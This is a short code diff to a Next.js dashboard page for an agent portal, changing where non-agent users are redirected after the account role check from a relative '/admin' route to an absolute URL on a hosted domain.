@@ -67,7 +67,7 @@ export default function DashboardPage(){
       const {data:{user},error:authError}=await db.auth.getUser();
       if(!live)return;
       if(authError||!user){router.replace("/agen/login");return}
-      try{const {profile}=await apiRequest<{profile:{role:string}}>("/api/account");if(profile.role!=="AGENT"){router.replace("/admin");return;}}catch{await db.auth.signOut();router.replace("/agen/login");return;}
+      try{const {profile}=await apiRequest<{profile:{role:string}}>("/api/account");if(profile.role!=="AGENT"){window.location.assign("https://imbabc.mrchongno1.chatgpt.site/admin");return;}}catch{await db.auth.signOut();router.replace("/agen/login");return;}
       setUserId(user.id);setUserName(String(user.user_metadata?.name||user.email||"Akun"));
       const {data,error:orgError}=await db.from("organizations").select("id,name").eq("owner_id",user.id).order("created_at",{ascending:true}).limit(1);
       if(!live)return;
